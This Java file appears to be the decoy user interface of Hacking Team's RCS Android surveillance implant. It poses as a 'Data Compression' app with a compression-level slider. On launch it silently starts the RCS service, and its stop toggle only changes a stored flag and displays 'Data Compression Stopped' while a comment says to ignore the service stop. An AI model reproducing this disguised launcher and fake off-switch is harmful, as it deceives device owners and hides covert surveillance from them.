/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AndroidServiceGUI.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.gui;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.SeekBar;
import android.widget.SeekBar.OnSeekBarChangeListener;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import com.android.networking.Core;
import com.android.networking.R;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

/**
 * The Class AndroidServiceGUI.
 */
public class AGUI extends Activity implements OnSeekBarChangeListener {
	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$

	private SeekBar seekBar;
	private TextView textProgress;

	/**
	 * Called when the activity is first created.
	 * 
	 * @param savedInstanceState
	 *            the saved instance state
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		actualCreate(savedInstanceState);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
		SharedPreferences.Editor editor = preferences.edit();
		editor.putInt("compressionLevel", seekBar.getProgress());
		editor.commit();
	}

	@Override
	public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
		if (progress >= 0 && progress <= 25) {
			progress = 25;
			seekBar.setProgress(progress);
		} else if (progress > 25 && progress <= 50) {
			progress = 50;
			seekBar.setProgress(progress);
		} else if (progress > 50 && progress <= 75) {
			progress = 75;
			seekBar.setProgress(progress);
		} else {
			progress = 100;
			seekBar.setProgress(progress);
		}

		textProgress.setText("Compression Level: " + progress + "%");
	}

	@Override
	public void onStartTrackingTouch(SeekBar seekBar) {
		// TODO Auto-generated method stub
	}

	@Override
	public void onStopTrackingTouch(SeekBar seekBar) {
		// TODO Auto-generated method stub
	}

	private void actualCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		final String service = "com.android.networking.app"; //$NON-NLS-1$
		// final String service = "android.intent.action.MAIN";
		
		try {
			if (Core.isServiceRunning() == false) {
				final ComponentName cn = startService(new Intent(service));

				if (cn == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
					}
				}
			}
		} catch (final SecurityException se) {
			if (Cfg.EXCEPTION) {
				Check.log(se);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
			}
		}
		
		setContentView(R.layout.main);
			
		// Set up click listeners
		final Button runButton = (Button) findViewById(R.id.btntoggle);

		// Seekbar listener
		seekBar = (SeekBar) findViewById(R.id.seekBar);
		seekBar.setOnSeekBarChangeListener(this);
		textProgress = (TextView) findViewById(R.id.textProgress);

		// Retrieve saved status
		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());

		try {
			seekBar.setProgress(preferences.getInt("compressionLevel", 0));
		} catch (Exception e) {
			seekBar.setProgress(75);
		}
		
		try {
			((ToggleButton) runButton).setChecked(preferences.getBoolean("running", false));
		} catch (Exception e) {
			((ToggleButton) runButton).setChecked(false);
		}
		
		runButton.setOnClickListener(new OnClickListener() {
			// @Override
			public void onClick(final View v) {
				SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
				SharedPreferences.Editor editor = preferences.edit();
				
				if (((ToggleButton) v).isChecked()) {
					editor.putBoolean("running", true);
					
					Toast.makeText(AGUI.this, "Data Compression Started", Toast.LENGTH_LONG).show();
				} else {
					editor.putBoolean("running", false);
					
					// IGNORA LO STOP DEL SERVIZIO
					Toast.makeText(AGUI.this, "Data Compression Stopped", Toast.LENGTH_LONG).show();
				}
				
				editor.commit();
			}
		});
	}
}
